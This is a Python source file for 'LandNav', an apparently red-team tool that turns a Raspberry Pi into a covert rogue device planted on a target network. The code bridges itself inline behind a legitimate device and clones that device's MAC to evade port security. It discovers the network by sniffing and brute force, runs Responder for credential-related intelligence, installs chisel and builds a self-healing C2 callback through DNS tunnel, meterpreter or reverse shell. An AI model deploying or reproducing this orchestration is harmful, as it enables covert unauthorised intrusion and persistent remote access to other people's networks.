#!/usr/bin/env python3
"""LandNav — Automated rogue device network bootstrapper.

Automates the entire lifecycle of a drop device deployment:
  1. Detect interfaces and deployment mode (bridge vs standalone)
  2. Establish transparent bridge or direct network access
  3. Discover network configuration (DHCP, ARP, LLDP, brute force)
  4. Configure the Pi's network connectivity
  5. Start passive recon + Responder analyzer (continuous intelligence)
  6. Establish C2 callback (DNS tunnel → meterpreter → reverse shell)
  7. Monitor and re-establish C2 on failure

Designed for Raspberry Pi 4B running Kali Linux ARM.
Deployed via systemd — runs automatically on boot.

Usage:
    python3 landnav.py                  # Normal operation (boot mode)
    python3 landnav.py --config FILE    # Use alternate config
    python3 landnav.py --dry-run        # Log actions without executing
    python3 landnav.py --status         # Print current state and exit
"""

VERSION = "0.11.1"

import argparse
import datetime
import json
import logging
import logging.handlers
import os
import platform
import shutil
import signal
import subprocess
import sys
import tempfile
import threading
import time
import yaml
from pathlib import Path

# Ensure lib/ is importable
_HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(_HERE))

from lib import led
from lib import netconfig
from lib import bridge
from lib import discovery
from lib import egress
from lib.passive import PassiveCollector
from lib.responder import ResponderAnalyzer

# ── Constants ───────────────────────────────────────────────────

DEFAULT_CONFIG = _HERE / "config.yaml"
LOCK_FILE = Path("/var/run/landnav.pid")
STATUS_FILE = Path("/var/run/landnav_status.json")
CLIENTS_BASE = Path("/clients")
CLEANUP_AGE_DAYS = 30

log = logging.getLogger("landnav")

# Per-run output directory (set in main())
_run_dir = None

# Passive recon + Responder handles (module-level for status/cleanup)
_passive_collector = None
_responder_analyzer = None

# Status heartbeat
_heartbeat_stop = threading.Event()
_start_time = datetime.datetime.now().isoformat()

# ── Status Heartbeat ───────────────────────────────────────────

def _write_status():
    try:
        data = {
            "pid": os.getpid(),
            "version": VERSION,
            "started": _start_time,
            "c2_state": egress._current_state,
            "c2_method": egress._c2_method,
            "last_heartbeat": datetime.datetime.now().isoformat(),
        }
        tmp = str(STATUS_FILE) + ".tmp"
        with open(tmp, "w") as f:
            json.dump(data, f)
        os.replace(tmp, str(STATUS_FILE))
    except Exception:
        pass

def _heartbeat_loop():
    while not _heartbeat_stop.is_set():
        _write_status()
        _heartbeat_stop.wait(30)

def _start_heartbeat():
    t = threading.Thread(target=_heartbeat_loop, daemon=True)
    t.start()
    return t

def _stop_heartbeat():
    _heartbeat_stop.set()
    STATUS_FILE.unlink(missing_ok=True)

# ── Run Directory ───────────────────────────────────────────────

def create_run_dir():
    """Create a timestamped run directory under /clients.

    Returns: Path to the new run directory.
    """
    CLIENTS_BASE.mkdir(parents=True, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    run_dir = CLIENTS_BASE / f"landnav_{ts}"
    run_dir.mkdir(parents=True, exist_ok=True)
    return run_dir


def cleanup_old_runs():
    """Delete landnav_* run directories older than CLEANUP_AGE_DAYS."""
    if not CLIENTS_BASE.is_dir():
        return

    cutoff = datetime.datetime.now() - datetime.timedelta(days=CLEANUP_AGE_DAYS)

    for entry in CLIENTS_BASE.iterdir():
        if not entry.is_dir() or not entry.name.startswith("landnav_"):
            continue
        try:
            ts_str = entry.name[len("landnav_"):]
            dir_time = datetime.datetime.strptime(ts_str, "%Y%m%d_%H%M%S")
        except ValueError:
            continue

        if dir_time < cutoff:
            log.info("Cleaning up old run directory: %s", entry)
            shutil.rmtree(entry, ignore_errors=True)


# ── Logging Setup ───────────────────────────────────────────────

def setup_logging(run_dir, cfg):
    """Configure logging with file rotation and optional console output."""
    log_dir = run_dir
    log_dir.mkdir(parents=True, exist_ok=True)
    level = getattr(logging, cfg.get("level", "INFO").upper(), logging.INFO)

    root = logging.getLogger()
    root.setLevel(level)

    fmt = logging.Formatter(
        "%(asctime)s [%(levelname)-8s] %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    # Rotating file handler
    max_bytes = cfg.get("max_size_mb", 50) * 1024 * 1024
    fh = logging.handlers.RotatingFileHandler(
        log_dir / "landnav.log", maxBytes=max_bytes, backupCount=3,
    )
    fh.setFormatter(fmt)
    root.addHandler(fh)

    # Console handler
    if cfg.get("console", True):
        ch = logging.StreamHandler(sys.stdout)
        ch.setFormatter(fmt)
        root.addHandler(ch)

# ── PID Lock ────────────────────────────────────────────────────

def acquire_lock():
    if LOCK_FILE.exists():
        try:
            old_pid = int(LOCK_FILE.read_text().strip())
            os.kill(old_pid, 0)
            log.error("Another LandNav instance is running (PID %d)", old_pid)
            return False
        except (OSError, ValueError):
            pass
    LOCK_FILE.write_text(str(os.getpid()))
    return True

def release_lock():
    LOCK_FILE.unlink(missing_ok=True)

# ── Signal Handlers ─────────────────────────────────────────────

_shutdown = False

def _handle_signal(signum, frame):
    global _shutdown
    _shutdown = True
    egress.force_shutdown()

# ── Phase 1: Interface Detection ───────────────────────────────

def phase_detect_interfaces(cfg):
    """Detect ethernet interfaces and determine deployment mode.

    Performs a thorough review of existing networking before deciding:
      1. Check for existing system-managed bridge → use it (bridge-reuse mode)
      2. Check for USB-ethernet adapter → LandNav bridge mode
      3. Single ethernet only → standalone mode

    Returns:
        dict: mode ("bridge"|"bridge-reuse"|"standalone"),
              uplink, downstream, existing_bridge (bool)
    """
    log.info("════════ Phase 1: Interface Detection ════════")

    # ── Step 1: Check for existing system-managed bridge ───────
    if netconfig.interface_exists(bridge.BRIDGE_NAME):
        br_info = netconfig.get_interface_info(bridge.BRIDGE_NAME)
        br_members = netconfig.get_bridge_ports(bridge.BRIDGE_NAME)
        is_system = netconfig.is_system_managed_bridge(bridge.BRIDGE_NAME)
        log.info("Existing bridge %s: state=%s ip=%s members=%s system_managed=%s",
                 bridge.BRIDGE_NAME, br_info["state"], br_info["ip"],
                 br_members, is_system)

        if is_system and br_info["ip"] and br_info["state"] == "UP":
            ifaces = netconfig.detect_interfaces()
            log.info("Detected physical interfaces: %s", ifaces)
            downstream = None
            for eth in ifaces.get("all_eth", []):
                if eth not in br_members:
                    downstream = eth
                    break
            if downstream:
                log.info("System bridge %s is UP — adding downstream %s to it",
                         bridge.BRIDGE_NAME, downstream)
                netconfig.set_interface_up(downstream)
            else:
                log.info("System bridge %s is UP — no additional downstream found",
                         bridge.BRIDGE_NAME)
            return {
                "mode": "bridge-reuse",
                "uplink": br_members[0] if br_members else None,
                "downstream": downstream,
                "existing_bridge": True,
            }

    # ── Step 2: Detect physical ethernet interfaces ────────────
    ifaces = netconfig.detect_interfaces()
    log.info("Detected physical interfaces: %s", ifaces)

    uplink = ifaces["onboard"]
    usb_eth = ifaces["usb_eth"]

    if not uplink:
        log.error("No onboard ethernet interface found")
        return None

    netconfig.set_interface_up(uplink)
    time.sleep(2)

    if not netconfig.interface_has_carrier(uplink):
        log.warning("%s has no carrier — cable may not be connected", uplink)

    bridge_cfg = cfg.get("network", {}).get("bridge", {})

    if usb_eth and usb_eth != uplink and bridge_cfg.get("auto_detect", True):
        log.info("USB-ethernet detected (%s) — BRIDGE mode", usb_eth)
        netconfig.set_interface_up(usb_eth)
        return {"mode": "bridge", "uplink": uplink, "downstream": usb_eth,
                "existing_bridge": False}

    log.info("No USB-ethernet — STANDALONE mode on %s", uplink)
    return {"mode": "standalone", "uplink": uplink, "downstream": None,
            "existing_bridge": False}

# ── Phase 2: Network Setup ─────────────────────────────────────

def phase_network_setup(iface_info, cfg):
    """Establish network connectivity.

    Bridge-reuse: System bridge already working — read existing config.
    Bridge mode:  Create bridge, sniff legit device traffic, learn config.
    Standalone:   DHCP → passive sniff → active probe → brute force.

    Returns:
        discovery.NetworkConfig on success, None on failure
    """
    log.info("════════ Phase 2: Network Setup ════════")

    net_cfg = cfg.get("network", {})
    disc_cfg = net_cfg.get("discovery", {})
    mode = iface_info["mode"]
    uplink = iface_info["uplink"]
    downstream = iface_info["downstream"]

    if mode == "bridge-reuse":
        return _setup_bridge_reuse_mode(net_cfg, iface_info)
    elif mode == "bridge":
        return _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg)
    else:
        return _setup_standalone_mode(uplink, net_cfg, disc_cfg)


def _setup_bridge_reuse_mode(net_cfg, iface_info):
    """Use an existing system-managed bridge that already has connectivity.

    If iface_info includes a downstream interface (USB-ethernet), it is
    added to the system bridge so the connected device gets transparent
    L2 access to the network.
    """
    import re as _re
    br_info = netconfig.get_interface_info(bridge.BRIDGE_NAME)
    log.info("Using existing bridge %s: IP=%s", bridge.BRIDGE_NAME, br_info["ip"])

    downstream = iface_info.get("downstream")
    if downstream:
        if bridge.add_port(downstream):
            log.info("Downstream %s added to system bridge %s — "
                     "connected device has transparent network access",
                     downstream, bridge.BRIDGE_NAME)
        else:
            log.warning("Failed to add downstream %s to bridge — "
                        "connected device will NOT have network access", downstream)

    config = discovery.NetworkConfig()
    config.ip = br_info["ip"]
    config.cidr = br_info["cidr"] or 24
    config.discovery_method = "existing-bridge"

    try:
        r = subprocess.run(["ip", "route", "show", "default"],
                         capture_output=True, text=True, check=False, timeout=5)
        m = _re.search(r"via\s+(\d+\.\d+\.\d+\.\d+)", r.stdout)
        if m:
            config.gateway = m.group(1)
    except Exception:
        pass

    try:
        resolv = Path("/etc/resolv.conf").read_text()
        config.dns_servers = [
            line.split()[1] for line in resolv.splitlines()
            if line.strip().startswith("nameserver") and len(line.split()) >= 2
        ]
    except Exception:
        config.dns_servers = net_cfg.get("fallback_dns", ["8.8.8.8"])

    try:
        netconfig.set_interface_promisc(bridge.BRIDGE_NAME, True)
    except Exception:
        pass

    log.info("Bridge reuse: IP=%s GW=%s DNS=%s",
             config.ip, config.gateway, config.dns_servers)
    return config


def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
    """Bridge mode network setup."""
    bridge_cfg = net_cfg.get("bridge", {})

    # ── Pre-bridge MAC clone (port security bypass) ──────────────
    # Detect the legitimate device's MAC BEFORE creating the bridge
    # or sending any traffic upstream.  Clone it onto the uplink
    # interface so the switch only ever sees one MAC on the port.
    legit_mac = None
    if bridge_cfg.get("mac_transparency", True):
        legit_mac = bridge.sniff_downstream_mac(
            downstream, timeout=disc_cfg.get("dhcp_timeout", 30))
        if legit_mac:
            bridge.clone_mac(uplink, legit_mac)
        else:
            log.warning("Could not detect downstream MAC — port security "
                        "may block connectivity")

    led.set_state(led.BRIDGE_UP)
    if not bridge.create_bridge(uplink, downstream, stp=bridge_cfg.get("stp", False)):
        log.error("Bridge creation failed — falling back to standalone")
        return _setup_standalone_mode(uplink, net_cfg, disc_cfg)

    log.info("Bridge active — sniffing for legitimate device traffic")
    led.set_state(led.DISCOVERY)

    if not legit_mac:
        legit_mac = bridge.get_downstream_mac(downstream,
                                               timeout=disc_cfg.get("dhcp_timeout", 30))

    net_config = discovery.sniff_dhcp(
        bridge.BRIDGE_NAME,
        timeout=disc_cfg.get("dhcp_timeout", 30),
    )

    if not net_config.gateway:
        log.info("No DHCP observed — trying ARP sniff")
        arp_config = discovery.sniff_arp(
            bridge.BRIDGE_NAME,
            timeout=disc_cfg.get("sniff_timeout", 60),
        )
        if arp_config.gateway:
            net_config = arp_config

    if not net_config.gateway:
        log.info("No ARP data — trying LLDP/CDP")
        switch_info = discovery.sniff_lldp_cdp(bridge.BRIDGE_NAME, timeout=65)
        if switch_info.get("mgmt_ip"):
            log.info("Switch management IP: %s (VLAN: %s)",
                     switch_info["mgmt_ip"], switch_info.get("vlan"))

    if not net_config.gateway:
        ext_timeout = disc_cfg.get("sniff_extended", 300)
        log.info("Extended passive sniff (%ds)", ext_timeout)
        net_config = discovery.sniff_arp(bridge.BRIDGE_NAME, timeout=ext_timeout)

    if not net_config.gateway:
        log.info("Passive sniffing failed — active ARP probing")
        probe_result = discovery.probe_for_gateway(bridge.BRIDGE_NAME)
        if probe_result:
            net_config = probe_result

    if not net_config.gateway and disc_cfg.get("brute_force", True):
        log.info("Active probing failed — brute force")
        bf_result = discovery.brute_force_subnet(
            bridge.BRIDGE_NAME,
            timeout=disc_cfg.get("brute_force_timeout", 1800),
        )
        if bf_result:
            net_config = bf_result

    if not net_config.gateway:
        log.error("All network discovery methods failed")
        return None

    if legit_mac:
        net_config.client_mac = legit_mac

    if bridge_cfg.get("mac_transparency", True) and net_config.client_mac:
        bridge.set_mac_transparency(net_config.client_mac, uplink)

    if not net_config.cidr:
        net_config.cidr = 24

    pi_ip = discovery.find_unused_ip(
        net_config.gateway,
        cidr=net_config.cidr,
        preferred_octets=net_cfg.get("fallback_octets",
                                     [net_cfg.get("preferred_ip_octet", 236)]),
        iface=bridge.BRIDGE_NAME,
    )

    if not pi_ip:
        log.error("No unused IP available")
        return None

    net_config.ip = pi_ip

    dns_servers = net_config.dns_servers or net_cfg.get("fallback_dns", ["8.8.8.8"])
    bridge.configure_bridge_ip(
        pi_ip, net_config.cidr, net_config.gateway,
        dns_servers=dns_servers, domain=net_config.domain,
    )

    return net_config


def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
    """Standalone mode (eth0 only) network setup."""
    led.set_state(led.DISCOVERY)

    info = netconfig.get_interface_info(uplink)
    if info["ip"]:
        log.info("Interface %s already has IP %s — checking connectivity", uplink, info["ip"])
        if netconfig.internet_reachable():
            config = discovery.NetworkConfig()
            config.ip = info["ip"]
            config.cidr = info["cidr"] or 24
            config.discovery_method = "preexisting"
            return config

    log.info("Attempting DHCP on %s", uplink)
    if netconfig.run_dhclient(uplink, timeout=disc_cfg.get("dhcp_timeout", 30)):
        info = netconfig.get_interface_info(uplink)
        config = discovery.NetworkConfig()
        config.ip = info["ip"]
        config.cidr = info["cidr"] or 24
        config.discovery_method = "dhcp"
        try:
            r = subprocess.run(["ip", "route", "show", "default"],
                             capture_output=True, text=True, check=False, timeout=5)
            import re
            m = re.search(r"via\s+(\d+\.\d+\.\d+\.\d+)", r.stdout)
            if m:
                config.gateway = m.group(1)
        except Exception:
            pass
        return config

    netconfig.release_dhcp(uplink)

    log.info("DHCP failed — passive ARP sniff")
    netconfig.set_interface_up(uplink)
    netconfig.set_interface_promisc(uplink, True)

    net_config = discovery.sniff_arp(uplink, timeout=disc_cfg.get("sniff_timeout", 60))

    if not net_config.gateway:
        ext = disc_cfg.get("sniff_extended", 300)
        log.info("Short sniff failed — extended sniff (%ds)", ext)
        net_config = discovery.sniff_arp(uplink, timeout=ext)

    if not net_config.gateway:
        log.info("Passive sniff failed — active ARP probing")
        probe = discovery.probe_for_gateway(uplink)
        if probe:
            net_config = probe

    if not net_config.gateway and disc_cfg.get("brute_force", True):
        log.info("Active probing failed — brute force")
        bf = discovery.brute_force_subnet(
            uplink, timeout=disc_cfg.get("brute_force_timeout", 1800),
        )
        if bf:
            net_config = bf

    if not net_config.gateway:
        log.error("All standalone discovery methods failed")
        return None

    if not net_config.cidr:
        net_config.cidr = 24

    pi_ip = discovery.find_unused_ip(
        net_config.gateway, cidr=net_config.cidr,
        preferred_octets=net_cfg.get("fallback_octets",
                                     [net_cfg.get("preferred_ip_octet", 236)]),
        iface=uplink,
    )
    if not pi_ip:
        log.error("No unused IP available")
        return None

    net_config.ip = pi_ip
    netconfig.set_interface_promisc(uplink, False)
    netconfig.set_ip(uplink, pi_ip, net_config.cidr)
    netconfig.set_default_route(net_config.gateway, uplink)

    dns_servers = net_config.dns_servers or net_cfg.get("fallback_dns", ["8.8.8.8"])
    netconfig.set_dns(dns_servers, net_config.domain)

    return net_config

# ── Phase 3: Network Validation ────────────────────────────────

def phase_validate_network(net_config, cfg):
    """Verify connectivity and discover services (DNS, proxy).

    Returns: True if network is usable, False otherwise
    """
    log.info("════════ Phase 3: Network Validation ════════")

    if not net_config or not net_config.ip:
        log.error("No network configuration to validate")
        return False

    if net_config.gateway:
        if netconfig.can_reach_gateway(net_config.gateway):
            log.info("✓ Gateway %s reachable (Layer 2)", net_config.gateway)
        else:
            log.warning("✗ Gateway %s unreachable via ARP", net_config.gateway)

    if net_config.gateway:
        if netconfig.ping(net_config.gateway):
            log.info("✓ Gateway %s responds to ping (Layer 3)", net_config.gateway)
        else:
            log.warning("✗ Gateway %s does not respond to ping", net_config.gateway)

    net_cfg = cfg.get("network", {})
    fallback_dns = net_cfg.get("fallback_dns", ["8.8.8.8", "1.1.1.1"])

    if not net_config.dns_servers:
        log.info("No DNS servers from discovery — searching")
        net_config.dns_servers = discovery.discover_dns_servers(
            net_config.gateway, net_config,
        )

    if net_config.dns_servers:
        log.info("✓ DNS servers: %s", net_config.dns_servers)
        netconfig.set_dns(net_config.dns_servers, net_config.domain)
    else:
        log.warning("No local DNS found — using fallback: %s", fallback_dns)
        net_config.dns_servers = fallback_dns
        netconfig.set_dns(fallback_dns)

    resolved = netconfig.dns_resolves(cfg["c2"]["host"])
    if resolved:
        log.info("✓ DNS resolves %s → %s", cfg["c2"]["host"], resolved)
    else:
        log.warning("✗ Cannot resolve %s — C2 may need IP fallback", cfg["c2"]["host"])

    proxy_cfg = net_cfg.get("proxy", {})
    if proxy_cfg.get("host"):
        net_config.proxy_host = proxy_cfg["host"]
        net_config.proxy_port = proxy_cfg["port"]
        log.info("Using manual proxy: %s:%d", net_config.proxy_host, net_config.proxy_port)
    elif proxy_cfg.get("auto_detect", True):
        proxy_host, proxy_port = discovery.detect_proxy(net_config.gateway)
        if proxy_host:
            net_config.proxy_host = proxy_host
            net_config.proxy_port = proxy_port
            log.info("✓ Proxy detected: %s:%d", proxy_host, proxy_port)
        else:
            log.info("No proxy detected")

    if netconfig.internet_reachable():
        log.info("✓ Internet reachable")
    else:
        log.info("✗ Internet not reachable — C2 will use internal routes / DNS tunnel")

    led.set_state(led.NETWORK_UP)
    return True

# ── Passive Recon Launch ───────────────────────────────────────

def start_passive_recon(iface_info, cfg):
    """Start passive network intelligence collection and Responder analyzer."""
    global _passive_collector, _responder_analyzer

    passive_cfg = cfg.get("passive", {})
    responder_cfg = cfg.get("responder", {})

    if not passive_cfg.get("enabled", True):
        log.info("Passive recon disabled in config")
        return None, None

    if iface_info["mode"] == "bridge" and bridge.bridge_is_up():
        sniff_iface = bridge.BRIDGE_NAME
    else:
        sniff_iface = iface_info["uplink"]

    recon_dir = _run_dir / "recon"

    log.info("════════ Passive Recon: Starting ════════")

    flush_interval = passive_cfg.get("flush_interval", 30)
    _passive_collector = PassiveCollector(
        iface=sniff_iface,
        recon_dir=str(recon_dir),
        flush_interval=flush_interval,
    )
    _passive_collector.start()
    log.info("Passive collector started on %s (flush every %ds)",
             sniff_iface, flush_interval)

    if responder_cfg.get("enabled", True):
        responder_path = responder_cfg.get("path")
        _responder_analyzer = ResponderAnalyzer(
            iface=sniff_iface,
            recon_dir=str(recon_dir),
            responder_path=responder_path,
        )
        if _responder_analyzer.start():
            log.info("Responder analyzer started on %s", sniff_iface)
        else:
            log.warning("Responder analyzer failed to start — continuing without it")
            _responder_analyzer = None
    else:
        log.info("Responder analyzer disabled in config")
        _responder_analyzer = None

    return _passive_collector, _responder_analyzer


def stop_passive_recon():
    """Stop passive recon and Responder. Flushes final data to disk."""
    global _passive_collector, _responder_analyzer

    if _responder_analyzer:
        log.info("Stopping Responder analyzer")
        _responder_analyzer.stop()
        _responder_analyzer = None

    if _passive_collector:
        log.info("Stopping passive collector (%d hosts observed)",
                 _passive_collector.get_host_count())
        _passive_collector.stop()
        _passive_collector = None

# ── Phase 4: C2 Egress ─────────────────────────────────────────

def phase_c2_egress(net_config, cfg):
    """Establish C2 callback.

    Returns: str method name on success, None on failure
    """
    log.info("════════ Phase 4: C2 Egress Cascade ════════")
    led.set_state(led.C2_ATTEMPT)

    if net_config.proxy_host:
        cfg["_detected_proxy_host"] = net_config.proxy_host
        cfg["_detected_proxy_port"] = net_config.proxy_port

    method = egress.run_cascade(cfg)

    if method:
        log.info("════════ C2 ESTABLISHED via %s ════════", method)
        led.set_state(led.C2_CONNECTED)

        if _passive_collector:
            log.info("Passive recon active: %d hosts, %d subnets observed",
                     _passive_collector.get_host_count(),
                     len(_passive_collector.get_targets()))
        if _responder_analyzer and _responder_analyzer.is_running():
            log.info("Responder analyzer active — LLMNR/NBT-NS/WPAD intelligence collecting")
    else:
        log.error("════════ C2 FAILED — all methods exhausted ════════")
        led.set_state(led.ERROR)

    return method

# ── Auto-commands generation ────────────────────────────────────

_AUTO_CMD_PATH = _HERE / "auto_commands.txt"

def _generate_auto_commands(cfg: dict):
    """Rewrite auto_commands.txt — strip portfwd lines that overlap with
    SSH tunnel or Chisel forwards.
    """
    tunnel_ports: set = set()

    tunnel_cfg = cfg.get("ssh_tunnels")
    if tunnel_cfg:
        for fwd in tunnel_cfg.get("forwards", []):
            lp = fwd.get("local_port")
            if lp:
                tunnel_ports.add(int(lp))

    chisel_cfg = cfg.get("chisel", {})
    if chisel_cfg.get("enabled", False):
        chisel_fwds = chisel_cfg.get("forwards", [])
        if not chisel_fwds and tunnel_cfg:
            chisel_fwds = tunnel_cfg.get("forwards", [])
        for fwd in chisel_fwds:
            lp = fwd.get("local_port")
            if lp:
                tunnel_ports.add(int(lp))

    if not _AUTO_CMD_PATH.exists():
        log.debug("auto_commands.txt not found — skipping generation")
        return

    original_lines = _AUTO_CMD_PATH.read_text().splitlines()
    kept: list = []
    stripped: list = []
    for line in original_lines:
        raw = line.strip()
        if raw.startswith("portfwd") and tunnel_ports:
            parts = raw.split()
            try:
                li = parts.index("-l")
                lport = int(parts[li + 1])
                if lport in tunnel_ports:
                    stripped.append((lport, raw))
                    continue
            except (ValueError, IndexError):
                pass
        kept.append(line)

    if stripped:
        _AUTO_CMD_PATH.write_text("\n".join(kept) + "\n")
        for sp, sl in stripped:
            log.info("auto_commands: stripped portfwd -l %d (SSH tunnel takes over)", sp)
    else:
        log.debug("auto_commands: no portfwd/SSH-tunnel overlap — unchanged")


# ── Auto-Setup Helpers ──────────────────────────────────────────

_CHISEL_VERSION = "1.10.1"
_CHISEL_ARCH_MAP = {
    "aarch64": "arm64", "arm64": "arm64",
    "x86_64": "amd64", "amd64": "amd64",
    "armv7l": "armv7", "armv6l": "armv6",
}


def _ensure_config_current(cfg, config_path):
    """Sync live config with config.yaml.example."""
    example_path = _HERE / "config.yaml.example"
    if not example_path.exists():
        return cfg

    try:
        with open(example_path) as f:
            example_cfg = yaml.safe_load(f) or {}
    except Exception as e:
        log.warning("Could not read config.yaml.example: %s", e)
        return cfg

    changed = False

    for section_key, example_section in example_cfg.items():
        if section_key not in cfg:
            cfg[section_key] = example_section
            log.info("Config: added missing section: %s", section_key)
            changed = True
            continue

        if isinstance(example_section, dict) and isinstance(cfg[section_key], dict):
            live_section = cfg[section_key]
            for key, example_val in example_section.items():
                if key not in live_section:
                    live_section[key] = example_val
                    log.info("Config: %s.%s added (default: %s)",
                             section_key, key, example_val)
                    changed = True

    if cfg.get("chisel", {}).get("server_port") == 443:
        cfg["chisel"]["server_port"] = 8443
        log.info("Config: migrated chisel.server_port 443 → 8443")
        changed = True

    if cfg.get("chisel", {}).get("socks_port") == 1080:
        cfg["chisel"]["socks_port"] = 1081
        log.info("Config: migrated chisel.socks_port 1080 → 1081")
        changed = True

    if changed:
        try:
            with open(config_path, "w") as f:
                yaml.dump(cfg, f, default_flow_style=False, sort_keys=False)
            log.info("Config: updated %s", config_path)
        except Exception as e:
            log.warning("Config: could not write: %s (changes in memory only)", e)

    return cfg


def _ensure_chisel_binary():
    """Download the chisel binary if not in PATH."""
    if shutil.which("chisel"):
        return

    arch = _CHISEL_ARCH_MAP.get(platform.machine())
    if not arch:
        log.warning("Chisel: unknown architecture %s — cannot auto-install",
                     platform.machine())
        return

    sysname = "darwin" if platform.system().lower() == "darwin" else "linux"
    filename = "chisel_%s_%s_%s.gz" % (_CHISEL_VERSION, sysname, arch)
    url = ("https://github.com/jpillora/chisel/releases/download/"
           "v%s/%s" % (_CHISEL_VERSION, filename))
    dest = Path("/usr/local/bin/chisel")

    log.info("Chisel not installed — downloading %s for %s/%s",
             _CHISEL_VERSION, sysname, arch)

    tmp_gz = None
    try:
        tmp_fd, tmp_gz = tempfile.mkstemp(suffix=".gz")
        os.close(tmp_fd)

        rc = subprocess.run(
            ["curl", "-fsSL", "-o", tmp_gz, url],
            capture_output=True, text=True, timeout=120,
        )
        if rc.returncode != 0:
            log.error("Chisel download failed: %s", rc.stderr[:300])
            return

        subprocess.run(["gunzip", "-f", tmp_gz],
                       capture_output=True, timeout=30)
        tmp_bin = tmp_gz[:-3]

        shutil.move(tmp_bin, str(dest))
        dest.chmod(0o755)
        log.info("Chisel installed: %s", dest)

    except Exception as e:
        log.error("Chisel auto-install failed: %s", e)
    finally:
        if tmp_gz:
            for p in (tmp_gz, tmp_gz.replace(".gz", "")):
                try:
                    os.unlink(p)
                except OSError:
                    pass


def _ensure_ssh_keys():
    """Generate SSH tunnel keypair if missing."""
    key_path = _HERE / "keys" / "tunnel_key"
    if key_path.exists():
        return

    log.info("SSH tunnel key not found — generating ed25519 keypair")
    key_path.parent.mkdir(parents=True, exist_ok=True)

    try:
        hostname = platform.node() or "landnav"
        subprocess.run(
            ["ssh-keygen", "-t", "ed25519", "-f", str(key_path),
             "-N", "", "-C", "landnav-tunnel@%s" % hostname],
            capture_output=True, check=True, timeout=30,
        )
        key_path.chmod(0o600)
        log.info("SSH tunnel key generated: %s", key_path)
    except Exception as e:
        log.error("SSH key generation failed: %s", e)


# ── Main ────────────────────────────────────────────────────────

def main():
    global _shutdown, _run_dir, _start_time

    parser = argparse.ArgumentParser(
        description="LandNav v%s — Rogue device network bootstrapper" % VERSION,
    )
    parser.add_argument("--config", "-c", default=str(DEFAULT_CONFIG),
                        help="Path to config.yaml")
    parser.add_argument("--dry-run", action="store_true",
                        help="Log actions without executing network changes")
    parser.add_argument("--status", action="store_true",
                        help="Print current state and exit")
    parser.add_argument("--prep-handler", action="store_true",
                        help="Strip auto_commands.txt for SSH-tunneled ports and exit "
                             "(run on the C2 server before starting msfconsole)")
    parser.add_argument("--version", "-v", action="version",
                        version=f"LandNav {VERSION}")
    args = parser.parse_args()

    config_path = Path(args.config)
    if not config_path.exists():
        print(f"ERROR: Config file not found: {config_path}", file=sys.stderr)
        print(f"Copy config.yaml.example to config.yaml and edit it.", file=sys.stderr)
        sys.exit(1)

    with open(config_path) as f:
        cfg = yaml.safe_load(f)

    if args.prep_handler:
        _generate_auto_commands(cfg)
        sys.exit(0)

    if args.status:
        print(f"LandNav v{VERSION}")
        print(f"C2 State: {egress._current_state}")
        print(f"C2 Method: {egress._c2_method or 'none'}")
        if bridge.bridge_is_up():
            print(f"Bridge: UP ({bridge.BRIDGE_NAME})")
        if _passive_collector:
            print(f"Passive Recon: {_passive_collector.get_host_count()} hosts observed")
            print(f"Subnets: {', '.join(_passive_collector.get_targets())}")
        if _responder_analyzer and _responder_analyzer.is_running():
            print(f"Responder: ACTIVE (analyze mode)")
        sys.exit(0)

    _run_dir = create_run_dir()

    setup_logging(_run_dir, cfg.get("logging", {}))
    _start_time = datetime.datetime.now().isoformat()
    log.info("LandNav v%s starting", VERSION)
    log.info("Run directory: %s", _run_dir)

    cfg = _ensure_config_current(cfg, config_path)
    _ensure_chisel_binary()
    _ensure_ssh_keys()

    _generate_auto_commands(cfg)

    cleanup_old_runs()

    # Clean up stale bridges from prior runs before detecting interfaces
    bridge.cleanup_stale_bridges()

    if not acquire_lock():
        sys.exit(1)

    # Start status heartbeat for external watchdog
    _start_heartbeat()

    signal.signal(signal.SIGTERM, _handle_signal)
    signal.signal(signal.SIGINT, _handle_signal)

    led_cfg = cfg.get("led", {})
    led.init(
        led_path=led_cfg.get("path", "/sys/class/leds/ACT"),
        enabled=led_cfg.get("enabled", True),
    )
    led.set_state(led.BOOTING)

    try:
        # ── Phase 1: Interface Detection ────────────────────
        iface_info = phase_detect_interfaces(cfg)
        if not iface_info:
            log.error("No usable network interface — aborting")
            led.set_state(led.ERROR)
            time.sleep(30)
            sys.exit(1)

        # ── Phase 2: Network Setup ──────────────────────────
        net_config = phase_network_setup(iface_info, cfg)
        if not net_config:
            log.error("Network setup failed — aborting")
            led.set_state(led.ERROR)
            time.sleep(30)
            sys.exit(1)

        log.info("Network acquired: IP=%s/%s GW=%s DNS=%s (via %s)",
                 net_config.ip, net_config.cidr, net_config.gateway,
                 net_config.dns_servers, net_config.discovery_method)

        # ── Phase 3: Validation ─────────────────────────────
        phase_validate_network(net_config, cfg)

        # ── Start passive recon (runs continuously) ─────────
        start_passive_recon(iface_info, cfg)

        # ── Phase 4: C2 Egress ──────────────────────────────
        retry_interval = cfg["c2"].get("retry_interval", 60)

        while not _shutdown:
            method = phase_c2_egress(net_config, cfg)

            if method:
                if egress._current_state == egress.EgressState.FAILED:
                    log.warning("C2 session ended (%s) — re-entering cascade", method)
                    led.set_state(led.C2_ATTEMPT)
                    continue

                log.info("C2 active via %s — starting watchdog", method)
                egress.start_watchdog(cfg, on_reconnect=lambda m: led.set_state(led.C2_CONNECTED))

                while not _shutdown:
                    time.sleep(5)
                    if egress._current_state == egress.EgressState.FAILED:
                        log.warning("C2 dropped (%s) — re-entering cascade", method)
                        led.set_state(led.C2_ATTEMPT)
                        break

                egress.stop_watchdog()

                if _shutdown:
                    break
            else:
                log.info("Retrying C2 cascade in %ds", retry_interval)
                led.set_state(led.ERROR)

                for _ in range(retry_interval):
                    if _shutdown:
                        break
                    time.sleep(1)

    except Exception as e:
        log.exception("Unhandled exception: %s", e)
        led.set_state(led.ERROR)
    finally:
        log.info("LandNav shutting down")
        led.set_state(led.SHUTDOWN)

        _stop_heartbeat()

        stop_passive_recon()

        time.sleep(3)
        led.stop()

        bridge.destroy_bridge()

        release_lock()
        log.info("LandNav stopped")


if __name__ == "__main__":
    main()
